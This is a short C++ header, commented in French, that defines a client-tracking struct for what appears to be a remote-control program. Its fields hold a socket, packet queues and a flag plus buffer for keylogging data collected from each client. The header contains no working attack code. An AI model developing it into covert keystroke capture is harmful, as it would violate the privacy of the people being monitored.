#ifndef				_RXCLIENTINFOS_H__
# define			_RXCLIENTINFOS_H__

#include			<string>
#include			<list>
#include			"RxWSocket.h"
#include			"RxProtocol.h"

struct				RxClientInfos
{
	bool					identified;		// Identification passee
	std::string				name;			// ID du client, unique
	RxWSocket*				socket;			// Socket ..
	std::list<RxPacket*>	toSend;			// Liste des packets a envoyer
	RxPacket				toRead;			// Buffer de lecture
	int						offset;			// Offset du packet de lecture
	bool					KeyLogOn;		// KeyLog on ou Off ?
	std::string				keyLogData;		// Infos du keylog...

	RxClientInfos()
	{
		this->identified = false;
		this->name = "";
		this->socket = 0;
		this->KeyLogOn = false;
		this->keyLogData = "";
		this->offset = 0;
		memset((char*)&toRead, 0, sizeof(toRead));
	}

	~RxClientInfos()
	{
		; // Remplir !
	}
};

#endif				// _RXCLIENTINFOS_H__